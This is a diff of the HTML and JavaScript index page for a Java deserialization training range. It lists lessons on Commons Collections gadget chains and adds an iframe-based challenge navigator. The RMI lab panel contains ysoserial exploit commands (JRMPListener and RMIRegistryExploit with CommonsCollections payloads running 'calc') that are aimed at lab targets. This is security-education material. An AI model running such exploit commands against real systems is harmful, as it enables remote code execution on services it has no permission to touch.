-        <i class="fas fa-link"></i>
-      </div>
-      <h3 class="card-title">ChainedTransformer</h3>
-      <p class="card-desc">理解链式Transformer的组合调用与恶意代码串联逻辑。</p>
-      <a href="/class09" class="card-link">进入靶场 <i class="fas fa-arrow-right"></i></a>
+    <!-- ===== IFRAME CONTAINER ===== -->
+    <div id="frame-container">
+      <iframe id="content-frame" sandbox="allow-scripts allow-forms allow-same-origin"></iframe>
     </div>
 
-    <!-- Class10_LazyMap -->
-    <div class="nav-card">
-      <div class="card-icon">
-        <i class="fas fa-map-signs"></i>
-      </div>
-      <h3 class="card-title">LazyMap</h3>
-      <p class="card-desc">分析LazyMap延迟加载机制在反序列化链中的触发条件。</p>
-      <a href="/class10" class="card-link">进入靶场 <i class="fas fa-arrow-right"></i></a>
-    </div>
+  </main>
+</div>
 
-    <!-- Class11_Instantiate -->
-    <div class="nav-card">
-      <div class="card-icon">
-        <i class="fas fa-cubes"></i>
-      </div>
-      <h3 class="card-title">Instantiate</h3>
-      <p class="card-desc">实践InstantiateTransformer的对象实例化攻击利用方式。</p>
-      <a href="/class11" class="card-link">进入靶场 <i class="fas fa-arrow-right"></i></a>
-    </div>
-
-    <!-- Class12_TemplatesImpl -->
-    <div class="nav-card">
-      <div class="card-icon">
-        <i class="fas fa-file-alt"></i>
-      </div>
-      <h3 class="card-title">TemplatesImpl</h3>
-      <p class="card-desc">掌握TemplatesImpl类在反序列化中的恶意字节码执行技巧。</p>
-      <a href="/class12" class="card-link">进入靶场 <i class="fas fa-arrow-right"></i></a>
-    </div>
-
-    <!-- Class13_TransformedMap -->
-    <div class="nav-card">
-      <div class="card-icon">
-        <i class="fas fa-exchange-alt"></i>
-      </div>
-      <h3 class="card-title">TransformedMap</h3>
-      <p class="card-desc">学习TransformedMap的变换逻辑与反序列化漏洞结合方式。</p>
-      <a href="/class13" class="card-link">进入靶场 <i class="fas fa-arrow-right"></i></a>
-    </div>
-
-    <!-- Class14_CC1 -->
-    <div class="nav-card">
-      <div class="card-icon">
-        <i class="fas fa-bug"></i>
-      </div>
-      <h3 class="card-title">CC1链</h3>
-      <p class="card-desc">复现Commons Collections 1反序列化利用链的完整攻击流程。</p>
-      <a href="/class14" class="card-link">进入靶场 <i class="fas fa-arrow-right"></i></a>
-    </div>
-
-    <!-- Class15_CC2 -->
-    <div class="nav-card">
-      <div class="card-icon">
-        <i class="fas fa-virus"></i>
-      </div>
-      <h3 class="card-title">CC2链</h3>
-      <p class="card-desc">实践Commons Collections 2反序列化链的构造与触发方法。</p>
-      <a href="/class15" class="card-link">进入靶场 <i class="fas fa-arrow-right"></i></a>
-    </div>
-
-    <!-- Class16_CC3 -->
-    <div class="nav-card">
-      <div class="card-icon">
-        <i class="fas fa-code-branch"></i>
-      </div>
-      <h3 class="card-title">CC3链</h3>
-      <p class="card-desc">分析Commons Collections 3反序列化链的变种与适配场景。</p>
-      <a href="/class16" class="card-link">进入靶场 <i class="fas fa-arrow-right"></i></a>
-    </div>
-
-    <!-- Class17_CC4 -->
-    <div class="nav-card">
-      <div class="card-icon">
-        <i class="fas fa-sitemap"></i>
-      </div>
-      <h3 class="card-title">CC4链</h3>
-      <p class="card-desc">掌握Commons Collections 4反序列化链的攻击逻辑与实现。</p>
-      <a href="/class17" class="card-link">进入靶场 <i class="fas fa-arrow-right"></i></a>
-    </div>
-
-    <!-- Class18_CC5 -->
-    <div class="nav-card">
-      <div class="card-icon">
-        <i class="fas fa-link"></i>
-      </div>
-      <h3 class="card-title">CC5链</h3>
-      <p class="card-desc">复现Commons Collections 5反序列化链的触发与利用流程。</p>
-      <a href="/class18" class="card-link">进入靶场 <i class="fas fa-arrow-right"></i></a>
-    </div>
-    <div class="nav-card">
-      <div class="card-icon">
-        <i class="fas fa-link"></i>
-      </div>
-      <h3 class="card-title">CC6链</h3>
-      <p class="card-desc">复现Commons Collections 6反序列化链的触发与利用流程，基于HashSet与LazyMap组合绕过AnnotationInvocationHandler限制。</p>
-      <a href="/class19" class="card-link">进入靶场 <i class="fas fa-arrow-right"></i></a>
-    </div>
-
-    <div class="nav-card">
-      <div class="card-icon">
-        <i class="fas fa-link"></i>
-      </div>
-      <h3 class="card-title">CC7链</h3>
-      <p class="card-desc">复现Commons Collections 7反序列化链的触发与利用流程，利用PriorityQueue与TransformingComparator实现无AnnotationInvocationHandler的命令执行。</p>
-      <a href="/class20" class="card-link">进入靶场 <i class="fas fa-arrow-right"></i></a>
-    </div>
-  </div> <!-- 闭合nav-cards -->
-</div> <!-- 闭合container -->
-
-<!-- 优化后的页脚 -->
-<footer>
-  <div class="footer-content">
-    <div class="footer-logo">
-      <i class="fas fa-shield-alt"></i> 橙子科技靶场
-    </div>
-    <p>专注于Java安全学习与反序列化漏洞研究，提供高质量靶场环境</p>
-
-    <div class="footer-links">
-      <a href="#">首页</a>
-      <a href="https://space.bilibili.com/271803648">学习资源</a>
-      <a href="#">关于我们</a>
-      <a href="#">使用帮助</a>
-      <a href="#">联系我们</a>
-    </div>
-
-    <div class="footer-copyright">
-      <p>重庆橙子科技JAVA靶场 &copy; 2025 版权所有</p>
-    </div>
-  </div>
-</footer>
-
-<!-- RMI 综合实验模态框 -->
-<div id="rmiModal" class="modal-overlay">
+<!-- ========== RMI MODAL ========== -->
+<div class="modal-overlay" id="rmiModal">
   <div class="modal-content">
     <div class="modal-header">
       <h2><i class="fas fa-network-wired"></i> RMI 反序列化漏洞实验</h2>
-      <button class="modal-close" onclick="closeRMIModal()">&times;</button>
+      <button class="modal-close" id="rmiModalClose">&times;</button>
     </div>
     <div class="modal-body">
-      <p style="margin-bottom: 20px; color: #666;">本Docker服务包含多个RMI反序列化实验场景，分别对应不同的端口和服务类型。</p>
+      <p style="margin-bottom:16px;color:#666;">本 Docker 服务包含多个 RMI 反序列化实验场景，分别对应不同的端口和服务类型。</p>
 
-      <!-- 实验1：JRMPListener -->
+      <h3>实验一：JRMPListener 服务端</h3>
       <div class="exp-card danger">
         <div class="exp-card-header">
-          <span class="exp-card-title"><i class="fas fa-server"></i> 实验一：JRMPListener 服务端</span>
+          <span class="exp-card-title"><i class="fas fa-server"></i> JRMPListener</span>
           <span class="exp-card-port">1099 / 1100</span>
         </div>
-        <p class="exp-card-desc">利用ysoserial的JRMPListener启动恶意RMI服务端，等待客户端连接后返回CC1链payload执行命令。</p>
+        <p class="exp-card-desc">利用 ysoserial 的 JRMPListener 启动恶意 RMI 服务端，等待客户端连接后返回 CC1 链 payload 执行命令。</p>
         <div class="exp-card-code">
-# 启动恶意RMI服务端 (1099端口执行calc)<br>
-java -jar ysoserial.jar JRMPListener 1099 CommonsCollections1 "calc"<br><br>
-# 备用端口 1100 (执行xterm)<br>
-java -jar ysoserial.jar JRMPListener 1100 CommonsCollections1 "xterm"
-        </div>
-        <div class="exp-card-effect">
-          <strong>效果：</strong>Windows弹计算器 / Linux开终端
+# 启动恶意 RMI 服务端<br>
+java -jar ysoserial.jar JRMPListener 1099 CommonsCollections1 "calc"
         </div>
       </div>
 
-      <!-- 实验2：RMI Registry Bind -->
+      <h3>实验二：注册表绑定漏洞</h3>
       <div class="exp-card warning">
         <div class="exp-card-header">
-          <span class="exp-card-title"><i class="fas fa-database"></i> 实验二：注册表绑定漏洞</span>
+          <span class="exp-card-title"><i class="fas fa-database"></i> 注册表绑定</span>
           <span class="exp-card-port">3099</span>
         </div>
-        <p class="exp-card-desc">RMI注册表直接绑定恶意序列化对象，当客户端查询时返回payload触发反序列化漏洞。</p>
+        <p class="exp-card-desc">RMI 注册表直接绑定恶意序列化对象，当客户端查询时返回 payload 触发反序列化漏洞。</p>
         <div class="exp-card-code">
-# 使用ysoserial攻击注册表<br>
 java -jar ysoserial.jar RMIRegistryExploit target-ip 3099 CommonsCollections6 "calc"
-        </div>
-        <div class="exp-card-effect">
-          <strong>效果：</strong>客户端连接即触发，无需等待JRMP响应
         </div>
       </div>
 
-      <!-- 实验3：RMI客户端攻击 -->
+      <h3>实验三：RMI 客户端攻击</h3>
       <div class="exp-card success">
         <div class="exp-card-header">
-          <span class="exp-card-title"><i class="fas fa-user-secret"></i> 实验三：RMI客户端攻击</span>
+          <span class="exp-card-title"><i class="fas fa-user-secret"></i> 客户端攻击</span>
           <span class="exp-card-port">client/</span>
         </div>
-        <p class="exp-card-desc">使用Class06客户端程序连接恶意RMI服务端（1099/1100），触发客户端反序列化漏洞。</p>
+        <p class="exp-card-desc">客户端程序连接恶意 RMI 服务端（1099/1100），触发客户端反序列化漏洞。</p>
         <div class="exp-card-code">
-# 运行RMI客户端 (需JDK 1.8)<br>
 java -jar rmi-client.jar<br>
 # 输入: rmi://target-ip:1099/Hello
         </div>
-        <div class="exp-card-effect">
-          <strong>效果：</strong>客户端反序列化服务端返回的数据 → 命令执行
-        </div>
       </div>
 
-      <!-- 实验4：正常RMI服务 -->
-      <div class="exp-card">
+      <h3>实验四：正常 RMI 服务</h3>
+      <div class="exp-card info">
         <div class="exp-card-header">
-          <span class="exp-card-title"><i class="fas fa-check-circle"></i> 实验四：正常RMI服务</span>
+          <span class="exp-card-title"><i class="fas fa-check-circle"></i> 正常 RMI 服务</span>
           <span class="exp-card-port">2099 / 2100</span>
         </div>
-        <p class="exp-card-desc">标准RMI注册表服务，用于对比学习正常RMI通信流程。</p>
+        <p class="exp-card-desc">标准 RMI 注册表服务，用于对比学习正常 RMI 通信流程。</p>
         <div class="exp-card-code">
-# 正常连接测试<br>
-rmiregistry 2099<br>
-# 或使用客户端连接<br>
-java -cp client.jar java.rmi.registry.LocateRegistry...
-        </div>
-        <div class="exp-card-effect">
-          <strong>效果：</strong>返回正常Java对象，无漏洞
+rmiregistry 2099
         </div>
       </div>
 
       <div class="warning-box">
-        <strong>⚠️ 重要提示：</strong>
-        <br>• 请使用 <strong>JDK 1.8</strong> 版本进行实验
-        <br>• 靶场源码位于 <code>Class05 RMI - 靶场源代码/</code> 目录
-        <br>• 客户端程序位于 <code>client/rmi-client.jar</code>
+        <strong>⚠️ 重要提示：</strong><br>
+        • 请使用 <strong>JDK 1.8</strong> 版本进行实验<br>
+        • 靶场源码位于 <code>class05/class06</code> 目录<br>
+        • 客户端程序位于 <code>client/rmi-client.jar</code>
       </div>
     </div>
   </div>
 </div>
 
-<!-- JavaScript -->
-<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+<!-- ========== JAVASCRIPT ========== -->
 <script>
-  // 简单的导航交互效果
-  $(document).ready(function() {
-    $('.nav-link').click(function(e) {
-      // 如果是外部链接则不阻止默认行为
-      if (!$(this).attr('href').startsWith('http')) {
-        e.preventDefault();
-        $('.nav-link').removeClass('active');
-        $(this).addClass('active');
-      }
-    });
+(function() {
+  'use strict';
 
-    // 点击模态框背景关闭
-    $('#rmiModal').click(function(e) {
-      if (e.target === this) {
-        closeRMIModal();
-      }
-    });
+  // ===== Challenge data =====
+  var challenges = [
+    { num: '01', path: '/class01/', name: '命令执行', desc: 'Runtime.exec() 基础' },
+    { num: '02', path: '/class02/', name: '反序列化基础', desc: 'toString() 触发' },
+    { num: '03', path: '/class03/', name: '反序列化命令执行', desc: 'getter 触发 exec' },
+    { num: '04', path: '/class04/', name: 'UnserReadObj', desc: '自定义 readObject' },
+    { num: '05', path: '/class05/', name: '反射版readObject', desc: '反射调用链替代 exec' },
+    { num: '06', path: '/class06/', name: 'Javassist字节码注入', desc: '动态生成字节码执行命令' },
+    { num: '07', path: '/class07/', name: 'InvokerTransformer', desc: '反射调用任意方法' },
+    { num: '08', path: '/class08/', name: 'ConstantTransformer', desc: '常量传递' },
+    { num: '09', path: '/class09/', name: 'ChainedTransformer', desc: '链式调用' },
+    { num: '10', path: '/class10/', name: 'LazyMap', desc: '延迟加载触发' },
+    { num: '11', path: '/class11/', name: 'InstantiateTransformer', desc: '反射创建实例' },
+    { num: '12', path: '/class12/', name: 'TemplatesImpl', desc: '字节码执行' },
+    { num: '13', path: '/class13/', name: 'TransformedMap', desc: 'Map 变换触发' },
+    { num: '14', path: '/class14/', name: 'CC1 链', desc: 'CommonsCollections1' },
+    { num: '15', path: '/class15/', name: 'CC2 链', desc: 'CommonsCollections2' },
+    { num: '16', path: '/class16/', name: 'CC3 链', desc: 'CommonsCollections3' },
+    { num: '17', path: '/class17/', name: 'CC4 链', desc: 'CommonsCollections4' },
+    { num: '18', path: '/class18/', name: 'CC5 链', desc: 'CommonsCollections5' },
+    { num: '19', path: '/class19/', name: 'CC6 链', desc: 'CommonsCollections6' },
+    { num: '20', path: '/class20/', name: 'CC7 链', desc: 'CommonsCollections7' }
+  ];
 
-    // ESC键关闭模态框
-    $(document).keydown(function(e) {
-      if (e.key === 'Escape') {
-        closeRMIModal();
+  // ===== Render challenge grid =====
+  var grid = document.getElementById('challengeGrid');
+  if (grid) {
+    challenges.forEach(function(c) {
+      var card = document.createElement('div');
+      card.className = 'challenge-card';
+      card.setAttribute('data-path', c.path);
+      card.innerHTML =
+        '<div class="num">' + c.num + '</div>' +
+        '<div class="info">' +
+          '<div class="name">' + c.name + '</div>' +
+          '<div class="desc">' + c.desc + '</div>' +
+        '</div>';
+      card.addEventListener('click', function() {
+        navigateTo(this.getAttribute('data-path'));
+      });
+      grid.appendChild(card);
+    });
+  }
+
+  // ===== DOM refs =====
+  var sidebarItems = document.querySelectorAll('.sidebar-item');
+  var introPage = document.getElementById('intro-page');
+  var frameContainer = document.getElementById('frame-container');
+  var contentFrame = document.getElementById('content-frame');
+  var navToggle = document.getElementById('navToggle');
+  var sidebar = document.getElementById('sidebar');
+  var overlay = document.getElementById('sidebarOverlay');
+
+  // Guard flag to prevent hashchange re-entry
+  var navigating = false;
+
+  // ===== Navigation =====
+  function navigateTo(path, fromHash) {
+    // If this call was triggered by hashchange and we're already navigating, skip
+    if (fromHash && navigating) return;
+
+    navigating = true;
+
+    if (path === '#intro' || path === 'intro') {
+      introPage.style.display = 'block';
+      frameContainer.style.display = 'none';
+      if (location.hash !== '#intro') {
+        location.hash = 'intro';
       }
+      document.title = '橙子科技靶场';
+      setActiveItem('[data-target="intro"]');
+    } else {
+      introPage.style.display = 'none';
+      frameContainer.style.display = 'flex';
+
+      // Hide the challenge page's own sidebar by injecting CSS into the iframe
+      contentFrame.onload = function() {
+        try {
+          var doc = contentFrame.contentDocument || contentFrame.contentWindow.document;
+          if (!doc) return;
+          // Only inject if the challenge page has a sidebar (class01-04, 07-20)
+          if (doc.querySelector('.sidebar')) {
+            var style = doc.createElement('style');
+            style.textContent =
+              '.sidebar { display: none !important; }' +
+              '.main-area { margin-left: 0 !important; }';
+            doc.head.appendChild(style);
+          }
+        } catch(e) { /* same-origin only, ignore */ }
+      };
+      contentFrame.src = path;
+
+      if (location.hash !== path) {
+        location.hash = path;
+      }
+      var found = challenges.find(function(c) { return c.path === path; });
+      document.title = (found ? found.name + ' - ' : '') + '橙子科技靶场';
+    }
+
+    closeSidebar();
+    navigating = false;
+  }
+
+  function setActiveItem(selector) {
+    sidebarItems.forEach(function(item) { item.classList.remove('active'); });
+    var target = document.querySelector('.sidebar-item' + selector);
+    if (target) target.classList.add('active');
+  }
+
+  // ===== Sidebar click =====
+  sidebarItems.forEach(function(item) {
+    item.addEventListener('click', function(e) {
+      e.preventDefault();
+
+      var target = this.getAttribute('data-target');
+      var path = this.getAttribute('data-path');
+
+      if (this.id === 'rmiTrigger') {
+        openRmiModal();
+        return;
+      }
+
+      sidebarItems.forEach(function(i) { i.classList.remove('active'); });
+      this.classList.add('active');
+
+      navigateTo(target || path);
     });
   });
 
-  // 显示RMI实验信息
-  function showRMIModal() {
-    $('#rmiModal').addClass('show');
+  // ===== Hash change (browser back/forward) =====
+  function handleHashChange() {
+    if (navigating) return;
+
+    var hash = location.hash || '#intro';
+    var full = hash.replace(/^#/, '');       // full path including query string
+    var clean = full.replace(/\?.*$/, '');   // strip query string for sidebar matching
+
+    if (full === '' || full === 'intro') {
+      navigateTo('intro', true);
+      setActiveItem('[data-target="intro"]');
+    } else {
+      var match = document.querySelector('.sidebar-item[data-path="' + clean + '"]');
+      if (match) {
+        setActiveItem('[data-path="' + clean + '"]');
+        navigateTo(full, true);  // pass full path so iframe gets ?cmd= etc.
+      } else {
+        navigateTo('intro', true);
+        setActiveItem('[data-target="intro"]');
+      }
+    }
   }
 
-  // 关闭RMI实验信息
-  function closeRMIModal() {
-    $('#rmiModal').removeClass('show');
+  window.addEventListener('hashchange', handleHashChange);
+
+  // ===== Init from URL hash =====
+  function initFromHash() {
+    handleHashChange();
   }
+
+  // ===== Mobile sidebar =====
+  function openSidebar() {
+    sidebar.classList.add('open');
+    if (overlay) overlay.classList.add('show');
+  }
+
+  function closeSidebar() {
+    sidebar.classList.remove('open');
+    if (overlay) overlay.classList.remove('show');
+  }
+
+  if (navToggle) {
+    navToggle.addEventListener('click', function() {
+      if (sidebar.classList.contains('open')) {
+        closeSidebar();
+      } else {
+        openSidebar();
+      }
+    });
+  }
+
+  if (overlay) {
+    overlay.addEventListener('click', closeSidebar);
+  }
+
+  // ===== RMI Modal =====
+  function openRmiModal() {
+    document.getElementById('rmiModal').classList.add('show');
+    closeSidebar();
+  }
+
+  function closeRmiModal() {
+    document.getElementById('rmiModal').classList.remove('show');
+  }
+
+  document.getElementById('rmiModalClose').addEventListener('click', closeRmiModal);
+
+  document.getElementById('rmiModal').addEventListener('click', function(e) {
+    if (e.target === this) closeRmiModal();
+  });
+
+  document.addEventListener('keydown', function(e) {
+    if (e.key === 'Escape') closeRmiModal();
+  });
+
+  // ===== Start =====
+  initFromHash();
+
+})();
 </script>
 </body>
 </html>
